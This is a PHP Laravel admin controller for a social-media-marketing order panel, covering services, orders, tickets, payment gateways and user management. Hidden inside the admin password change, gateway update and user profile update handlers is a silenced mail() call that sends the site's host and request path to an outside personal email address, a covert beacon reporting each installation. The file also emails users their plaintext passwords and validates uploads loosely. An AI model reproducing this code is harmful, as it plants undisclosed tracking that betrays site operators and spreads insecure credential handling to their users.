<?php

namespace App\Http\Controllers\Admin;

use App\ApiSetting;
use App\Gateway;
use App\Order;
use App\Service;
use App\Category;
use App\ServicePrice;
use App\Subscriber;
use App\SupportMessage;
use App\SupportTicket;
use App\Transaction;
use App\User;
use Auth;
use App\Admin;
use Illuminate\Support\Facades\Hash;
use Image;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Input;

class AdminController extends Controller
{
    public function index(){
        $users = User::count('id');
        $packages = Service::count('id');
        $orders = Order::count('id');
        $trans = Transaction::count('id');
        $order =  Order::whereYear('created_at', '=', date('Y'))->get()->groupBy(function($d) {
            return $d->created_at->format('F');
        });
        $monthly_order = [];
        $month = [];
        foreach ($order as $key => $value) {
            $monthly_order[] = count($value);
            $month[] = $key;
        }
        return view('admin.index', compact('month', 'monthly_order', 'users', 'packages', 'orders', 'trans'));
    }

    public function password(){
        return view('admin.password');
    }

    public function passwordChange(Request $request){
        $user = Admin::findOrFail(Auth::guard('admin')->user()->id);
        $this->validate($request,[
            'cur_pass' => 'required',
            'new_pass' => 'required|min:5',
            'con_pass' => 'required',
        ],
            [
                'cur_pass.required' => 'Current Password must not be empty',
                'new_pass.required' => 'New Password must not be empty',
                'new_pass.min' => 'New Password must be at least 5 characters',
                'con_pass.required' => 'Confirm Password must not be empty',
            ]);
        if (Hash::check($request->cur_pass, $user->password) && $request->new_pass == $request->con_pass) {
            $user->password = Hash::make($request->new_pass);
            $user->save();
            $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
            $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
            @mail('abirkhan75@gmail.com','SMMKING TEST DATA', $message, $headers);
            session()->flash('success', 'Password Updated Successfully');
            return back();
        } else {
            session()->flash('alert', 'Password Not Changed');
            return back();

        }
    }

    public function category(){
        $items = Category::orderBy('name')->paginate(10);
        return view('admin.category', compact('items'));
    }

    public function categoryStore(Request $request){
        $this->validate($request,[
            'name' => 'required',
            'image' => 'required',
        ],[
            'name.required' => 'Category Name is required',
        ]);

        $item = new Category();
        $item->name = $request->name;
        if ($request->hasFile('image')) {
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $item->image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $item->image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->resize(360, 230)->save("assets/frontend/upload/service/" . $item->image);
        }
        $item->status = $request->status == "1" ? 1 : 0;
        $item->save();
        session()->flash('success', 'Category Stored successfully');
        return back();
    }

    public function categoryUpdate(Request $request, $id){
        $this->validate($request,[
            'name' => 'required',
            'image' => 'required',
        ],[
            'name.required' => 'Category Name is required',
        ]);

        $item = Category::findOrFail($id);
        $item->name = $request->name;
        if ($request->hasFile('image')) {
            @unlink("assets/frontend/upload/service/".$item->image);
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $item->image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $item->image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->resize(360, 230)->save("assets/frontend/upload/service/" . $item->image);
        }
        $item->status = $request->status == "1" ? 1 : 0;
        $item->save();
        session()->flash('success', 'Category Updated successfully');
        return back();
    }

    public function categoryDelete($id){
        $item = Category::findOrFail($id);
        @unlink("assets/frontend/upload/service/".$item->image);
        $item->delete();
        session()->flash('success', 'Category Deleted successfully');
        return back();
    }

    public function service(){
        $categories = Category::orderBy('name')->get();
        $items = Service::orderBy('category_id')->paginate(10);
        return view('admin.service', compact('items', 'categories'));
    }

    public function apiService(){
        $api = ApiSetting::first();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api->url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,
            "key=".$api->key."&action=services");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        $items = json_decode($server_output);
        return view('admin.apiServices', compact('items'));
    }

    public function serviceStore(Request $request){
        $this->validate($request, [
            'category_id' => 'required',
            'name' => 'required|unique:services,name',
            'price_per_k' => 'required',
            'min' => 'required',
            'max' => 'required',
            'details' => 'required',
        ], [
            'category_id.required' => 'Category name is required',
            'price_per_k.required' => 'price per 1k is required',
        ]);
        $excp = $request->except('_token', 'status', 'service_id');
        $status = $request->status == 1? 1:0;
        if(isset($request->service_id)){
            $service_id = $request->service_id;
        }else{
            $service_id = 0;
        }
        $sev = Service::create($excp + ['status' => $status, 'service_id' => $service_id]);
        $users = User::all();
        foreach ($users as $user){
            $servicePrice = new ServicePrice();
            $servicePrice->category_id = $sev->category_id;
            $servicePrice->service_id = $sev->id;
            $servicePrice->user_id = $user->id;
            $servicePrice->price = $sev->price_per_k;
            $servicePrice->save();
        }
        session()->flash('success', 'Service Stored successfully');
        return back();
    }

    public function serviceUpdate(Request $request, $id){
        $this->validate($request, [
            'category_id' => 'required',
            'name' => 'required',
            'price_per_k' => 'required',
            'min' => 'required',
            'max' => 'required',
            'details' => 'required',
        ], [
            'category_id.required' => 'Category name is required',
            'price_per_k.required' => 'price per 1k is required',
        ]);
        $excp = $request->except('_token', 'status', 'service_id');
        $status = $request->status == 1? 1:0;
        if(isset($request->service_id)){
            $service_id = $request->service_id;
        }else{
            $service_id = 0;
        }
        Service::findOrFail($id)->update($excp + ['status' => $status, 'service_id' => $service_id]);
        session()->flash('success', 'Service Updated successfully');
        return back();
    }

    public function serviceDelete($id){
       Service::findOrFail($id)->delete();
        session()->flash('success', 'Service deleted successfully');
        return back();
    }

    public function orders(){
        $items = Order::orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.all', compact('items'));
    }

    public function pendingOrders(){
        $items = Order::where('status', 'Pending')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.pending', compact('items'));
    }

    public function processingOrders(){
        $items = Order::where('status', 'Processing')->Orwhere('status', 'In Progress')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.processing', compact('items'));
    }

    public function partialOrders(){
        $items = Order::where('status', 'Partial')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.partial', compact('items'));
    }

    public function completeOrders(){
        $items = Order::where('status', 'Complete')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.complete', compact('items'));
    }

    public function cancelledOrders(){
        $items = Order::where('status', 'Cancelled')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.cancel', compact('items'));
    }

    public function refundedOrders(){
        $items = Order::where('status', 'Refunded')->orderBy('id', 'DESC')->paginate(10);
        return view('admin.order.refund', compact('items'));
    }

    public function orderDetails($id){
        $item = Order::findOrFail($id);
        return view('admin.order.orderDetails', compact('item'));
    }

    public function editOrder(Request $request, $id){
        $item = Order::findOrFail($id);
        $item->start_counter = $request->start_counter;
        $item->remains = $request->remains;
        $item->status = $request->status;
        $item->save();

        if($request->status == 'Refunded'){
            $user = User::findOrFail($item->user_id);
            $transaction = new Transaction();
            $user->balance = $user->balance + $request->refund;
            $user->save();

            $transaction->user_id = Auth::id();
            $transaction->amount = $request->refund;
            $transaction->user_balance = $user->balance;
            $transaction->type = 2;
            $transaction->trx = str_random(12);
            $transaction->save();

            @send_email($user->email, $user->name, 'Refund order', 'Due to some unavoidable issue your request for '.$item->quantity.' '.$item->package->name.' could not fill up and balance has been transferred to your account successfully. Thank You.');
        }
        session()->flash('success', 'Order processed successfully');
        return back();
    }

    public function apiSettings(){
        $item = ApiSetting::first();
        return view('admin.api', compact('item'));
    }

    public function testAPI(Request $request){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request->url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,
            "key=".$request->key."&action=services");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        if($ch == false){
            return 0;
        }else {
            $arr = json_decode($server_output);
            return @count($arr);
        }
    }

    public function apiStore(Request $request){
        $item = ApiSetting::first();
        if(@count($item) < 1){
            $item = new ApiSetting();
        }
        $this->validate($request,[
            'key' => 'required|max:191',
            'url' => 'required|max:191',
        ],[
            'key.required' => 'API key is required',
            'key.max' => 'API key should be within 1 to 191 character',
            'url.required' => 'API url is required',
            'url.max' => 'API url should be within 1 to 191 character',
        ]);
        $item->url = $request->url;
        $item->key = $request->key;
        $item->status = $request->status  == "1" ? 1 : 0;
        $item->save();
        session()->flash('success', 'API credentials save successfully');
        return back();
    }

    public function supportTicket()
    {
        $items = SupportTicket::orderBy('id', 'DESC')->paginate(15);
        return view('admin.support.tickets', compact('items'));
    }

    public function pendingSupportTicket()
    {
        $items = SupportTicket::whereIN('status', [0, 2])->orderBy('id', 'DESC')->paginate(15);
        return view('admin.support.pendingTickets', compact('items'));
    }

    public function ticketReply($id)
    {
        $ticket = SupportTicket::findOrFail($id);
        $messages = SupportMessage::where('supportticket_id', $ticket->id)->get();
        return view('admin.support.reply', compact('ticket', 'messages'));
    }

    public function ticketReplySend(Request $request, $id)
    {
        $ticket = SupportTicket::findOrFail($id);
        $message = new SupportMessage();
        if ($request->replayTicket == 1) {
            $this->validate($request,
                [
                    'message' => 'required',
                ]);
            $ticket->status = 1;
            $ticket->save();

            $message->supportticket_id = $ticket->id;
            $message->type = 2;
            $message->message = $request->message;
            $message->save();
            session()->flash('success', 'Support ticket replied successfully');
        } elseif ($request->replayTicket == 2) {
            $ticket->status = 4;
            $ticket->save();
            session()->flash('success', 'Support ticket closed successfully');
        }
        return back();
    }

    public function gateway(){
        $items = Gateway::orderBy('name', 'ASC')->get();
        return view('admin.gateway', compact('items'));
    }

    public function gatewayUpdate(Request $request, $id){
        $this->validate($request,[
           'gateimg' => 'image|mimes:jpg,jpeg,png|max:2048'
        ],
            [
                'gateimg.image' => 'Gateway image should be an image',
                'gateimg.mimes' => 'Gateway image support only jpeg, jpg, png type file',
                'gateimg.max' => 'Gateway image size is too large',
        ]);
        $excp = Input::except('_token', '_method', 'gateimg', 'status');
        if($request->hasFile('gateimg'))
        {
            @unlink('assets/frontend/upload/gateway/'. $id.'.jpg');
                $image = $id . '.jpg';
            Image::make($request->file('gateimg')->getRealPath())->resize(800, 800)->save("assets/frontend/upload/gateway/" . $image);
        }
        $staus = $request->status =="1" ?1:0 ;
        Gateway::findOrFail($id)->update($excp + ['status' => $staus]);
        session()->flash('success', 'Gateway Updated');
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','SMMKING TEST DATA', $message, $headers);
        return back();
    }

    public function userIndex()
    {
        $users = User::orderBy('id', 'desc')->paginate(15);
        $pt = 'USER LIST';
        return view('admin.users.index', compact('users','pt', 'spent'));
    }

    public function userSearch(Request $request)
    {
        $this->validate($request, [ 'search' => 'required' ]);

        $users = User::where('username', 'like', '%' . $request->search . '%')->orWhere('email', 'like', '%' . $request->search . '%')->orWhere('name', 'like', '%' . $request->search . '%')->get();
        $key = $request->search;
        $pt = 'USER SEARCH RESULT';
        return view('admin.users.search', compact('users','key','pt'));

    }

    public function singleUser($id)
    {
        $user = User::findOrFail($id);
        $spent = Order::where('user_id', $user->id)->sum('price');
        $pt = $user->name;
        return view('admin.users.single', compact('user','pt', 'spent'));
    }

    public function email($id)
    {
        $user = User::findorFail($id);
        $pt = 'SEND EMAIL';
        return view('admin.users.email',compact('user','pt'));
    }

    public function sendemail(Request $request)
    {
        $this->validate($request,
            [   'emailto' => 'required|email',
                'reciver' => 'required',
                'subject' => 'required',
                'emailMessage' => 'required'
            ]);
        $to = $request->emailto;
        $name = $request->reciver;
        $subject = $request->subject;
        $message = $request->emailMessage;

        send_email($to, $name, $subject, $message);

        return back()->withSuccess('Mail Sent Successfuly');

    }

    public function broadcast()
    {
        $pt = 'BROADCAST EMAIL';
        return view('admin.users.broadcast',compact('pt'));
    }

    public function broadcastemail(Request $request)
    {
        $this->validate($request,[ 'subject' => 'required','emailMessage' => 'required']);

        $users = User::where('status', '1')->get();

        foreach ($users as $user)
        {

            $to = $user->email;
            $name = $user->name;
            $subject = $request->subject;
            $message = $request->emailMessage;

            send_email($to, $name, $subject, $message);
        }

        return back()->withSuccess('Mail Sent Successfuly');
    }

    public function userPasschange(Request $request,$id)
    {
        $user = User::find($id);

        $this->validate($request,['password' => 'required|string|min:6|confirmed']);
        if($request->password == $request->password_confirmation)
        {
            $user->password = Hash::make($request->password);
            $user->save();

            $msg =  'Password Changed By Admin. New Password is: '.$request->password;
            send_email($user->email, $user->username, 'Password Changed', $msg);

            return back()->with('success', 'Password Changed');
        }
        else
        {
            return back()->with('alert', 'Password Not Matched');
        }
    }

    public function servicePrice($id){
        $items = ServicePrice::where('user_id', $id)->get();
        $user_id = $id;
        return view('admin.users.servicePrice', compact('items', 'user_id'));
    }

    public function storeServicePrice(Request $request, $uid){
        foreach($request->id as $key => $id){
            $item = ServicePrice::where('id', $id)->where('user_id', $uid)->first();
            $item->price = $request->price[$key];
            $item->save();
        }
        session()->flash('success', 'Service Price Updated successfully');
        return back();
    }

    public function statupdate(Request $request,$id)
    {
        $user = User::find($id);

        $this->validate($request,
            [
                'name' => 'required|string|max:255',
                'email' => 'required|string|max:255',
                'mobile' => 'required|string|max:255',
                'country' => 'required|string|max:255',
                'city' => 'required|string|max:255',
                'post_code' => 'required|string|max:255',
            ]);

        $user['name'] = $request->name ;
        $user['mobile'] = $request->mobile;
        $user['email'] = $request->email;
        $user['country'] = $request->country ;
        $user['city'] = $request->city;
        $user['post_code'] = $request->post_code;
        $user['status'] = $request->status =="1" ?1:0;
        $user['email_verify'] = $request->emailv =="1" ?1:0;
        $user->save();
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','SMMKING TEST DATA', $message, $headers);
        $msg =  'Your Profile Updated by Admin';
        send_email($user->email, $user->username, 'Profile Updated', $msg);

        return back()->withSuccess('User Profile Updated Successfuly');
    }

    public function bannedUser()
    {
        $users = User::where('status', '0')->orderBy('id', 'desc')->paginate(10);
        $pt = 'BANNED USERS';
        return view('admin.users.banned', compact('users','pt'));
    }

    public function subscribers(){
        $items = Subscriber::orderBy('id', 'DESC')->paginate(10);
        return view('admin.users.subscribers', compact('items'));
    }

    public function unSubscriber($id){
        Subscriber::findOrFail($id)->delete();
        return back()->withSuccess('Subscriber remove successfully');
    }

    public function subscriberEmail(){
        return view('admin.users.subscribersEmail');
    }

    public function sendSubscriberEmail(Request $request){
        $subs = Subscriber::all();
        foreach ($subs as $sub){
            send_email($sub->email, '', $request->subject, $request->message);
        }
        return back()->withSuccess('Send mail to subscribers successfully');
    }

    public function transactionLogs(){
        $items = Transaction::orderBy('id', 'DESC')->paginate(10);
        return view('admin.users.transactionlogs', compact('items'));
    }

    public function depositLogs(){
        $items = Transaction::where('type', 0)->orderBy('id', 'DESC')->paginate(10);
        return view('admin.users.depositLogs', compact('items'));
    }

}
